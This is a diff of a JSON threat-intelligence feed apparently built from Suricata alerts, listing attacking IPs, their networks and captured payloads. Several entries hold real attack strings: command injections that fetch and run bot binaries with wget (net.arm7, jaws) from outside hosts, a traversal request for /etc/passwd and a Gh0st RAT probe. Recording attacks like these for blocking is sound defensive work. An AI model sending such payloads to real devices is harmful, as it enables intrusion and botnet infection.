@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-21T13:00:00Z",
+  "generated_at": "2026-10-22T01:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 58,
-    "v4": 58,
+    "total": 59,
+    "v4": 59,
     "v6": 0
   },
   "items": [
@@ -150,10 +150,7 @@
       ],
       "asn": "16276",
       "asn_name": "OVH OVH SAS",
-      "asn_prefix": "54.36.0.0/16",
-      "tags": [
-        "tor:exit-node"
-      ]
+      "asn_prefix": "54.36.0.0/16"
     },
     {
       "ip": "193.189.100.205",
@@ -230,42 +227,6 @@
       "asn_prefix": "171.25.193.0/24",
       "tags": [
         "tor:exit-node"
-      ]
-    },
-    {
-      "ip": "130.94.24.42",
-      "family": "v4",
-      "first_seen": "2026-10-14T16:00:00Z",
-      "last_seen": "2026-10-14T16:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP request field missing colon"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "154177",
-      "asn_name": "LIGHT4-AS-AP - LIGHT NODE LIMITED",
-      "asn_prefix": "130.94.24.0/23",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "160.119.66.206",
-      "family": "v4",
-      "first_seen": "2026-10-14T16:00:00Z",
-      "last_seen": "2026-10-14T16:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "49870",
-      "asn_name": "AS49870-BV Alsycon B.V.",
-      "asn_prefix": "160.119.64.0/22",
-      "payloads": [
-        "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20net.arm7%3B%20wget%20http%3A%2F%2F160.119.66.206%2Fbins%2Fnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fnet.arm7%20tbk"
       ]
     },
     {
@@ -1072,6 +1033,60 @@
       "asn_prefix": "192.161.49.0/24",
       "payloads": [
         "GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      ]
+    },
+    {
+      "ip": "102.220.161.79",
+      "family": "v4",
+      "first_seen": "2026-10-21T21:00:00Z",
+      "last_seen": "2026-10-21T21:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 1"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "197769",
+      "asn_name": "VPSDEDICATED-AS VPS Dedicated LLC",
+      "asn_prefix": "102.220.160.0/23"
+    },
+    {
+      "ip": "58.3.134.126",
+      "family": "v4",
+      "first_seen": "2026-10-21T19:00:00Z",
+      "last_seen": "2026-10-21T19:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT MVPower DVR Shell UCE"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "7679",
+      "asn_name": "QTNET - QTnet,Inc.",
+      "asn_prefix": "58.3.128.0/17",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws"
+      ]
+    },
+    {
+      "ip": "66.240.205.34",
+      "family": "v4",
+      "first_seen": "2026-10-21T23:00:00Z",
+      "last_seen": "2026-10-21T23:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP URI terminated by non-compliant character"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "10439",
+      "asn_name": "CARINET - CariNet, Inc.",
+      "asn_prefix": "66.240.192.0/18",
+      "tags": [
+        "mwl:scanner=\"shodan\""
+      ],
+      "payloads": [
+        "Gh0st\\xad\\xe0x\\x9cKS``\\x98\\xc3\\xc0\\xc0\\xc0\u0006\\xc4\\x8c@\\xbcQ\\x96\\x81\\x81 H\u0007\\xa7\u0016\\x95e&\\xa7*\u0004$&g+\u00182\\x94\\xf6\\xb000\\xac\\xa8rc\u0001\u0011\\xa0\\x82\u001f\\`&\\x83\\xc7K7\\x86\u0019\\xe5n\f9\\x95n\f;\\x84\u000f3\\xac\\xe8sch\\xa8^\\xcf4'J\\x97\\xa9\\x82\\xe30\\xc3\\x91h]&\\x90\\xf8\\xce\\x97S\\xcbA4L?2=\\xe1\\xc4\\x92\\x86\u000b@\\xf5`"
       ]
     }
   ]
